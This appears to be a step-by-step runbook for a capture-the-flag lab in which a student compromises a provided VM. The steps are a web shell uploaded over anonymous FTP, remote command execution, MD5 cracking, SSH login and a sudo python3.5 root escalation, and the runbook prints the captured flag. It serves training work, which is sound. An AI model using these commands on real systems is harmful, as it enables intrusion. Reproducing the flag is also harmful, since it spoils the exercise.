# docs.md — What to do (step-by-step runbook)

A practical checklist to go from this repo to a finished, audit-ready
submission. The full explanation of *why* each step works is in
[`README.md`](README.md); this file is just the *do this, then this* guide.

Everything runs against the **provided lab VM only**, on an isolated host-only
network.

---

## 0. What's already done vs. what you must do

**Already done for you (verified against the VM disk):**
- The complete attack chain is worked out and documented.
- The Go toolkit (`escalator`) and bash fallback (`scripts/enum.sh`) are built
  and tested.
- The flag is confirmed: `01Talent@nokOpA3eToFrU8r5sW1dipe2aky`.

**You must do (needs the booted VM / live network):**
1. Boot the VM and find its IP (§2).
2. Crack the `shrek` MD5 to get the password (§5).
3. Run the chain live and take the 6 screenshots (§3–§8, `images/`).
4. Fill in your name and submit (§9).

---

## 1. Set up

1. Import the VM (VirtualBox → File → Import Appliance → `01-Local.ova`).
2. Set its network adapter to **Host-Only** or **Bridged** (NOT NAT), or you
   won't be able to scan it.
3. Start the VM. You don't need to log into it — you attack it over the network.
4. Build the toolkit on your host:
   ```bash
   cd /home/skopetos/cyber/escalator
   make build            # produces ./escalator
   ```

---

## 2. Find the VM's IP  → screenshot `images/01-discovery.png`

```bash
./escalator discover
```

Note the IP that shows ports `21,22,80` (VirtualBox MAC starts `08:00:27`).
Export it so the rest of the commands just work:

```bash
export TARGET=192.168.56.XXX      # <-- put the real IP here
./escalator discover -target $TARGET -ports 1-1024
```

> Alternatives if you prefer: `sudo netdiscover -r 192.168.56.0/24`,
> `sudo arp-scan --localnet`, or `nmap -sn 192.168.56.0/24`.

---

## 3. Look at the website  (recon)

```bash
curl http://$TARGET/
curl http://$TARGET/files/
```

You'll see the "HackMe Please!" page and the `/files/` directory listing.

---

## 4. Get a foothold via anonymous FTP  → screenshots `02` and `03`

Upload the web shell (anonymous login, blank password):

```bash
ftp $TARGET
#   Name: anonymous
#   Password: (just press Enter)
ftp> cd /
ftp> put scripts/cmd.php
ftp> bye
```

Confirm remote code execution as `www-data`:

```bash
curl "http://$TARGET/files/cmd.php?c=id"
# uid=33(www-data) gid=33(www-data) ...
```

- Screenshot `02-ftp-upload.png` = the FTP `put`.
- Screenshot `03-rce-www-data.png` = the `curl ...?c=id` output.

---

## 5. Recover and crack the credential  → screenshot `04`

```bash
curl "http://$TARGET/files/cmd.php?c=cat%20/home/important.txt"
curl "http://$TARGET/files/cmd.php?c=cat%20/.runme.sh"
```

The `.runme.sh` output ends with:

```
shrek:061fe5e7b95d5f98208d7bc89ed2d569
```

Crack that MD5 → this is the one value you must obtain yourself:

- Easiest: paste `061fe5e7b95d5f98208d7bc89ed2d569` into
  <https://crackstation.net> — it returns the password instantly.
- Offline: `hashcat -m 0 hash.txt rockyou.txt` (or
  `john --format=raw-md5 --wordlist=rockyou.txt hash.txt`).

Call the result `SHREK_PASSWORD` and screenshot the `.runme.sh` line as
`04-runme-cred.png`.

---

## 6. Log in as shrek  → screenshot `05`

```bash
ssh shrek@$TARGET          # password: SHREK_PASSWORD
cat user.txt               # the user flag
sudo -l                    # -> (root) NOPASSWD: /usr/bin/python3.5
```

Screenshot the `ssh` session + `sudo -l` output as `05-ssh-shrek.png`.

> Optional sanity check: run the enumerator on the box to see the vector
> auto-detected —
> `scp scripts/enum.sh shrek@$TARGET:/tmp/ && ssh shrek@$TARGET bash /tmp/enum.sh`

---

## 7. Escalate to root  → screenshot `06` (the important one)

```bash
sudo /usr/bin/python3.5 -c 'import os; os.system("/bin/bash")'
id                         # uid=0(root)
cat /root/root.txt         # the flag
```

Screenshot the root prompt (`uid=0`) next to the flag as `06-root-flag.png`.
**This is your proof of root access** — the one shot the audit cares about most.

---

## 8. Save the screenshots

Put all six PNGs in `images/` with the exact names above, then uncomment the
`![...]` image lines in `README.md` (Proof screenshots section) so they render.

---

## 9. Finish the write-up & submit

1. In `README.md`, replace the signature name in the
   **Vulnerability report email** with your own.
2. Re-read the **Ethical hacking report** and **Remediation** sections so you can
   speak to them in the audit role-play (see the Stakeholder Q&A prep at the
   bottom of `README.md`).
3. Commit and push:
   ```bash
   git add -A
   git commit -m "Escalator: walkthrough, Go toolkit, and reports"
   git push
   ```
   (The `.ova`, `disk.raw`, and compiled binary are git-ignored on purpose.)

---

## Quick command cheat-sheet

```bash
export TARGET=192.168.56.XXX
./escalator discover                                   # find the VM
./escalator discover -target $TARGET -ports 1-1024     # scan ports
# --- foothold ---
ftp $TARGET            # anonymous / blank pw ; put scripts/cmd.php
curl "http://$TARGET/files/cmd.php?c=id"
curl "http://$TARGET/files/cmd.php?c=cat%20/.runme.sh" # -> shrek:MD5
# --- crack MD5 at crackstation.net -> SHREK_PASSWORD ---
ssh shrek@$TARGET      # SHREK_PASSWORD
sudo -l                # (root) NOPASSWD: /usr/bin/python3.5
sudo /usr/bin/python3.5 -c 'import os; os.system("/bin/bash")'
id && cat /root/root.txt
```

Flag (already confirmed): `01Talent@nokOpA3eToFrU8r5sW1dipe2aky`
